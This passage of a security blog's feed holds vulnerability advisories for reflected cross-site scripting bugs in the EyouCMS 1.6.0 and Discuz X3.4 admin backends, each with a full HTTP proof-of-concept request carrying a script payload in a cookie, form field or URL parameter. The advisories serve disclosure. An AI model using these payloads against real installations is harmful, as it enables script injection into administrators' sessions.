class="attribute">Origin</span><span class="punctuation">: </span>http://127.0.0.1</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://127.0.0.1/cms/eyoucms/login.php?m=admin&amp;c=Article&amp;a=add&amp;typeid=10&amp;gourl=http%3A%2F%2F10.142.11.10%3A20003%2Feyoucms%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_archives%26typeid%3D10%26lang%3Dcn&amp;lang=cn</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=lmqk1pcmj5egvt269qo4ijgg82; admin_lang=cn; home_lang=cn; referurl=http%3A%2F%2F127.0.0.1%2Fcms%2Feyoucms%2Findex.php%3Fm%3Duser%26c%3DPay%26a%3Dpay_consumer_details; users_id=1; ENV_IS_UPHTML=0; workspaceParam=index%7CArchives; ENV_GOBACK_URL=%2Feyoucms%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_archives%26lang%3D=cn; ENV_LIST_URL=%2Feyoucms%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_archives%26lang%3Dcn&quot;/&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>383</span><br><span class="line"></span><br><span class="line"><span class="language-sas">gourl=<span class="variable">&amp;free_content</span>=<span class="variable">&amp;htmlfilename</span>=<span class="variable">&amp;type_tempview</span>=view_article.htm<span class="variable">&amp;tempview</span>=view_article.htm<span class="variable">&amp;add_time</span>=2022-11-05+20:47:11<span class="variable">&amp;arcrank</span>=0<span class="variable">&amp;click</span>=846<span class="variable">&amp;author</span>=aa<span class="variable">&amp;seo_description</span>=gaeg<span class="variable">&amp;seo_keywords</span>=egae<span class="variable">&amp;seo_title</span>=aeg<span class="variable">&amp;tags</span>=aeg%2C<span class="title function_">%E6</span>%93%8D<span class="title function_">%E4</span><span class="title function_">%BD</span>%9C<span class="title function_">%E7</span><span class="title function_">%B3</span><span class="title function_">%BB</span><span class="title function_">%E7</span><span class="title function_">%BB</span>%9F<span class="variable">&amp;addonFieldExt</span>[content]=&lt;p&gt;aegaeg&lt;/p&gt;<span class="variable">&amp;size</span>=1<span class="variable">&amp;part_free</span>=0<span class="variable">&amp;users_price</span>=<span class="variable">&amp;litpic_remote</span>=<span class="variable">&amp;litpic_local</span>=<span class="variable">&amp;jumplinks</span>=<span class="variable">&amp;typeid</span>=11<span class="variable">&amp;title</span>=aegaeg</span></span><br></pre></td></tr></table></figure><p><img src="/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45537)/201614458-17b781bf-148a-419c-9b92-7e9f0527d78d.png"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://github.com/weng-xianhu/eyoucms/issues/34">Github Issue</a></li><li><a href="https://www.cve.org/CVERecord?id=CVE-2022-45537">CVE</a></li></ul><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
    
    
    <summary type="html">EyouCMS-V1.6.0-UTF8-SP1 with Backend Reflected Cross-Site Scripting in backend login.php when publishing article.</summary>
    
    
    
    <category term="Vulnerability" scheme="https://srpopty.github.io/categories/Vulnerability/"/>
    
    
    <category term="Web" scheme="https://srpopty.github.io/tags/Web/"/>
    
    <category term="CVE" scheme="https://srpopty.github.io/tags/CVE/"/>
    
    <category term="XSS" scheme="https://srpopty.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>EyouCMS V1.6.0 Backend Reflected XSS (CVE-2022-45538)</title>
    <link href="https://srpopty.github.io/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45538)/"/>
    <id>https://srpopty.github.io/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45538)/</id>
    <published>2023-02-15T13:12:41.000Z</published>
    <updated>2023-02-15T13:12:41.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Backend article publish with reflected-XSS in the cookie <code>ENV_GOBACK_URL</code>.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>EyouCMS &lt;= 1.6.0-UTF8-SP1</p><p><img src="/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45538)/201610031-73f82844-05e0-4182-a275-028613c349bd.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cms/eyoucms/login.php?m=admin&amp;c=Article&amp;a=add&amp;lang=cn</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:80</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://127.0.0.1</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://127.0.0.1/cms/eyoucms/login.php?m=admin&amp;c=Article&amp;a=add&amp;typeid=10&amp;gourl=http%3A%2F%2F10.142.11.10%3A20003%2Feyoucms%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_archives%26typeid%3D10%26lang%3Dcn&amp;lang=cn</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=lmqk1pcmj5egvt269qo4ijgg82; admin_lang=cn; home_lang=cn; referurl=http%3A%2F%2F127.0.0.1%2Fcms%2Feyoucms%2Findex.php%3Fm%3Duser%26c%3DPay%26a%3Dpay_consumer_details; users_id=1; ENV_IS_UPHTML=0; workspaceParam=index%7CArchives; ENV_GOBACK_URL=%2Feyoucms%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_archives%26lang%3D&quot;/&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a; ENV_LIST_URL=%2Feyoucms%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_archives%26lang%3Dcn</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>383</span><br><span class="line"></span><br><span class="line"><span class="language-sas">gourl=<span class="variable">&amp;free_content</span>=<span class="variable">&amp;htmlfilename</span>=<span class="variable">&amp;type_tempview</span>=view_article.htm<span class="variable">&amp;tempview</span>=view_article.htm<span class="variable">&amp;add_time</span>=2022-11-05+20:47:11<span class="variable">&amp;arcrank</span>=0<span class="variable">&amp;click</span>=846<span class="variable">&amp;author</span>=aa<span class="variable">&amp;seo_description</span>=gaeg<span class="variable">&amp;seo_keywords</span>=egae<span class="variable">&amp;seo_title</span>=aeg<span class="variable">&amp;tags</span>=aeg%2C<span class="title function_">%E6</span>%93%8D<span class="title function_">%E4</span><span class="title function_">%BD</span>%9C<span class="title function_">%E7</span><span class="title function_">%B3</span><span class="title function_">%BB</span><span class="title function_">%E7</span><span class="title function_">%BB</span>%9F<span class="variable">&amp;addonFieldExt</span>[content]=&lt;p&gt;aegaeg&lt;/p&gt;<span class="variable">&amp;size</span>=1<span class="variable">&amp;part_free</span>=0<span class="variable">&amp;users_price</span>=<span class="variable">&amp;litpic_remote</span>=<span class="variable">&amp;litpic_local</span>=<span class="variable">&amp;jumplinks</span>=<span class="variable">&amp;typeid</span>=11<span class="variable">&amp;title</span>=aegaeg</span></span><br></pre></td></tr></table></figure><p><img src="/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45538)/201615717-be81fb04-1140-4e59-b83b-16244cab3fc8.png"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://github.com/weng-xianhu/eyoucms/issues/35">Github Issue</a></li><li><a href="https://www.cve.org/CVERecord?id=CVE-2022-45538">CVE</a></li></ul><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
    
    
    <summary type="html">EyouCMS-V1.6.0-UTF8-SP1 with Backend Reflected Cross-Site Scripting in backend login.php when publishing article.</summary>
    
    
    
    <category term="Vulnerability" scheme="https://srpopty.github.io/categories/Vulnerability/"/>
    
    
    <category term="Web" scheme="https://srpopty.github.io/tags/Web/"/>
    
    <category term="CVE" scheme="https://srpopty.github.io/tags/CVE/"/>
    
    <category term="XSS" scheme="https://srpopty.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>EyouCMS V1.6.0 Backend Reflected XSS (CVE-2022-45541)</title>
    <link href="https://srpopty.github.io/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45541)/"/>
    <id>https://srpopty.github.io/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45541)/</id>
    <published>2023-02-15T13:03:58.000Z</published>
    <updated>2023-02-15T13:03:58.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Backend article attribute type changing with reflected-XSS in the POST value <code>value</code> when the value contains non-integer char, this xss payload will be showed in error reporting message.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>EyouCMS &lt;= 1.6.0-UTF8-SP1</p><p><img src="/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45541)/201610031-73f82844-05e0-4182-a275-028613c349bd.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cms/eyoucms/login.php?m=admin&amp;c=Index&amp;a=changeTableVal&amp;_ajax=1&amp;lang=cn</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:80</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://127.0.0.1</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://127.0.0.1/cms/eyoucms/login.php?m=admin&amp;c=ArchivesFlag&amp;a=index&amp;lang=cn</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=lmqk1pcmj5egvt269qo4ijgg82; admin_lang=cn; home_lang=cn; referurl=http%3A%2F%2F127.0.0.1%2Fcms%2Feyoucms%2Findex.php%3Fm%3Duser%26c%3DPay%26a%3Dpay_consumer_details; users_id=1; ENV_IS_UPHTML=0; ENV_LIST_URL=%2Feyoucms%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_draft%26lang%3Dcn; ENV_GOBACK_URL=%2Feyoucms%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_draft%26lang%3Dcn%26keywords%3Dfvg; workspaceParam=switch_map%7CIndex; ENV_IS_UPHTML=0</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>90</span><br><span class="line"></span><br><span class="line"><span class="language-sas">value=<span class="title function_">%BA0</span>&lt;script&gt;alert(1)&lt;/script&gt;<span class="variable">&amp;field</span>=status<span class="variable">&amp;id_value</span>=1<span class="variable">&amp;id_name</span>=id<span class="variable">&amp;table</span>=archives_flag</span></span><br></pre></td></tr></table></figure><p><img src="/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45541)/201617314-9974739a-12ef-4da5-9bbc-dc252941a50c.png"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://github.com/weng-xianhu/eyoucms/issues/36">Github Issue</a></li><li><a href="https://www.cve.org/CVERecord?id=CVE-2022-45541">CVE</a></li></ul><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
    
    
    <summary type="html">EyouCMS-V1.6.0-UTF8-SP1 with Backend Reflected Cross-Site Scripting in backend  loing.php when changing article attribute type.</summary>
    
    
    
    <category term="Vulnerability" scheme="https://srpopty.github.io/categories/Vulnerability/"/>
    
    
    <category term="Web" scheme="https://srpopty.github.io/tags/Web/"/>
    
    <category term="CVE" scheme="https://srpopty.github.io/tags/CVE/"/>
    
    <category term="XSS" scheme="https://srpopty.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>EyouCMS V1.6.0 Backend Reflected XSS (CVE-2022-45540)</title>
    <link href="https://srpopty.github.io/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45540)/"/>
    <id>https://srpopty.github.io/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45540)/</id>
    <published>2023-02-15T12:47:27.000Z</published>
    <updated>2023-02-15T12:47:27.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Backend article type adding with reflected-XSS in the post value <code>name</code> when the value contains malformed UTF-8 chars, this xss payload will be showed in error reporting message.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>EyouCMS &lt;= 1.6.0-UTF8-SP1</p><p><img src="/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45540)/201610031-73f82844-05e0-4182-a275-028613c349bd.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cms/eyoucms/login.php?m=admin&amp;c=Field&amp;a=arctype_add&amp;_ajax=1&amp;lang=cn</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:80</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://127.0.0.1</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://127.0.0.1/cms/eyoucms/login.php?m=admin&amp;c=Field&amp;a=arctype_add&amp;lang=cn</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=lmqk1pcmj5egvt269qo4ijgg82; admin_lang=cn; home_lang=cn; referurl=http%3A%2F%2F127.0.0.1%2Fcms%2Feyoucms%2Findex.php%3Fm%3Duser%26c%3DPay%26a%3Dpay_consumer_details; users_id=1; ENV_IS_UPHTML=0; ENV_LIST_URL=%2Feyoucms%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_draft%26lang%3Dcn; ENV_GOBACK_URL=%2Feyoucms%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_draft%26lang%3Dcn%26keywords%3Dfvg; workspaceParam=switch_map%7CIndex</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>91</span><br><span class="line"></span><br><span class="line"><span class="language-sas">channel_id=-99<span class="variable">&amp;remark</span>=af<span class="variable">&amp;dfvalue</span>=<span class="variable">&amp;dtype</span>=text<span class="variable">&amp;name</span>=&lt;script&gt;alert(1)&lt;/script&gt;<span class="title function_">%C0aef</span><span class="variable">&amp;title</span>=aef</span></span><br></pre></td></tr></table></figure><p><img src="/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45540)/201618239-d45d61ad-ed2c-446c-b236-badcf8c8145c.png"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://github.com/weng-xianhu/eyoucms/issues/37">Github Issue</a></li><li><a href="https://www.cve.org/CVERecord?id=CVE-2022-45540">CVE</a></li></ul><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
    
    
    <summary type="html">EyouCMS-V1.6.0-UTF8-SP1 with Backend Reflected Cross-Site Scripting in backend login.php when adding article type.</summary>
    
    
    
    <category term="Vulnerability" scheme="https://srpopty.github.io/categories/Vulnerability/"/>
    
    
    <category term="Web" scheme="https://srpopty.github.io/tags/Web/"/>
    
    <category term="CVE" scheme="https://srpopty.github.io/tags/CVE/"/>
    
    <category term="XSS" scheme="https://srpopty.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>EyouCMS V1.6.0 Backend Reflected XSS (CVE-2022-45539)</title>
    <link href="https://srpopty.github.io/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45539)/"/>
    <id>https://srpopty.github.io/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45539)/</id>
    <published>2023-02-15T12:38:21.000Z</published>
    <updated>2023-02-15T12:38:21.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Backend file adding with reflected-XSS in the GET value <code>activepath</code>.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>EyouCMS &lt;= 1.6.0-UTF8-SP1</p><p><img src="/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45539)/201610031-73f82844-05e0-4182-a275-028613c349bd.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/cms/eyoucms/login.php?m=admin&amp;c=Filemanager&amp;a=newfile&amp;activepath=%3Atemplate&quot;/&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a&amp;lang=cn</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:80</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://127.0.0.1</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://127.0.0.1/cms/eyoucms/login.php?m=admin&amp;c=Filemanager&amp;a=index&amp;lang=cn</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=lmqk1pcmj5egvt269qo4ijgg82; admin_lang=cn; home_lang=cn; referurl=http%3A%2F%2F127.0.0.1%2Fcms%2Feyoucms%2Findex.php%3Fm%3Duser%26c%3DPay%26a%3Dpay_consumer_details; users_id=1; ENV_IS_UPHTML=0; ENV_LIST_URL=%2Feyoucms%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_draft%26lang%3Dcn; ENV_GOBACK_URL=%2Feyoucms%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_draft%26lang%3Dcn%26keywords%3Dfvg; workspaceParam=switch_map%7CIndex</span><br></pre></td></tr></table></figure><p><img src="/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45539)/201619455-f28827d5-5826-4241-8fcd-9a7a8821f0d9.png"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://github.com/weng-xianhu/eyoucms/issues/38">Github Issue</a></li><li><a href="https://www.cve.org/CVERecord?id=CVE-2022-45539">CVE</a></li></ul><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
    
    
    <summary type="html">EyouCMS-V1.6.0-UTF8-SP1 with Backend Reflected Cross-Site Scripting in backend in login.php when adding file.</summary>
    
    
    
    <category term="Vulnerability" scheme="https://srpopty.github.io/categories/Vulnerability/"/>
    
    
    <category term="Web" scheme="https://srpopty.github.io/tags/Web/"/>
    
    <category term="CVE" scheme="https://srpopty.github.io/tags/CVE/"/>
    
    <category term="XSS" scheme="https://srpopty.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>Discuz X3.4 Backend Reflected XSS (CVE-2022-45543)</title>
    <link href="https://srpopty.github.io/2023/02/15/Vulnerability-Discuz-X3.4-Reflected-XSS-(CVE-2022-45543)/"/>
    <id>https://srpopty.github.io/2023/02/15/Vulnerability-Discuz-X3.4-Reflected-XSS-(CVE-2022-45543)/</id>
    <published>2023-02-15T12:25:54.000Z</published>
    <updated>2023-02-15T12:25:54.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Admin backend audit search of content audit component with reflected-XSS in POST value <code>dateline</code>, <code>title</code>, <code>tpp</code> and <code>username</code>, which bypassed discuz security check and even could hijack callback url link, and it can also inject javascript to setTimeout at the end of html response.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>DiscuzX &lt;= 3.4, SC_UTF8_20221111</p><p><img src="/2023/02/15/Vulnerability-Discuz-X3.4-Reflected-XSS-(CVE-2022-45543)/da3b14b2_12015184.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cms/discuz/upload/admin.php?action=moderate&amp;operation=threads</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.0.4</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>166</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.0.4</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.0.4/cms/discuz/upload/admin.php?action=moderate&amp;operation=threads</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>5Kkn_2132_saltkey=y03s5T45; 5Kkn_2132_lastvisit=1668496347; 5Kkn_2132_ulastactivity=07108qps3b3FkXEEZNxrT%2BtyQpXYN9%2FSOodQCNbMLoO%2BO6DOk8pF; 5Kkn_2132_auth=7791L55DZFdkAgcM5rDcnjIiVH0t%2BptlGCIqLkAhUIRMsUDTnq%2BGi7atBCt%2BPdyl2mCVv0hA3jA%2BxaOfDB1h; 5Kkn_2132_lastcheckfeed=1%7C1668501456; 5Kkn_2132_nofavfid=1; 5Kkn_2132_sid=yhpz44; 5Kkn_2132_lip=172.17.0.1%2C1668502019; 5Kkn_2132_lastact=1668502045%09admin.php%09</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-dts"><span class="attr">formhash</span><span class="operator">=</span><span class="number">288</span>a0c1d<span class="variable">&amp;scrolltop</span>=<span class="variable">&amp;anchor</span>=<span class="variable">&amp;username</span>=aa<span class="variable">&amp;title</span>=aa<span class="variable">&amp;tpp</span>=<span class="number">20</span><span class="variable">&amp;filter</span>=normal<span class="variable">&amp;modfid</span>=all<span class="variable">&amp;dateline</span>=<span class="number">604</span><span class="string">&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;!--&amp;modsubmit=%E6%8F%90%E4%BA%A4</span></span></span><br></pre></td></tr></table></figure><p><img src="/2023/02/15/Vulnerability-Discuz-X3.4-Reflected-XSS-(CVE-2022-45543)/a98c544f_12015184.png"></p><p><img 